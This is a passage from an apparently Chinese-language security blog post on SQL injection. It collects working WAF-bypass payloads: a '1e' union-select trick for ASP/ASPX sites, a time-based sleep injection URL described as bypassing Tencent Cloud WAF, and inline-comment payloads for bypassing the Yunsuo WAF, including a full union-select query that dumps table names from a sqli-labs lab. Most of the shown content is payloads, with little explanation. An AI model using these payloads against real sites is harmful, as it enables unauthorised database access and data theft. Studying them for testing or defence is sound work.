<p>只与数据库有关，与语言无关，故ASP与ASPX一样，可bypass</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1eunion select &#x27;1&#x27;,TABLE_NAME,1efrom INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1e_aspx_asp_exp.png" alt="1e_aspx_asp_exp"></p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="">http://www.5kik.com/other/607.html</a></p>
<h3 id="2018-10-10绕过腾讯云waf并延时注入"><a href="#2018-10-10绕过腾讯云waf并延时注入" class="headerlink" title="2018-10-10绕过腾讯云waf并延时注入"></a>2018-10-10绕过腾讯云waf并延时注入</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/?a=abc%22-sleep--%111%0A(15)-%22&amp;act=1&amp;t=solution&amp;uid=8890</span><br></pre></td></tr></table></figure>

<h3 id="云锁绕过"><a href="#云锁绕过" class="headerlink" title="云锁绕过"></a>云锁绕过</h3><h4 id="union-select注入"><a href="#union-select注入" class="headerlink" title="union select注入"></a>union select注入</h4><p>核心原理：内联注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union/*!60000x*/select 1--+</span><br><span class="line"></span><br><span class="line">select database/**/()--+</span><br><span class="line"></span><br><span class="line">1&#x27; -a()--+</span><br><span class="line"></span><br><span class="line">192.168.80.136/sqli/Less-1/?id=-1&#x27; union/*!60000x*//*!00000select*/ 1,2,group_concat(table_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
</search>
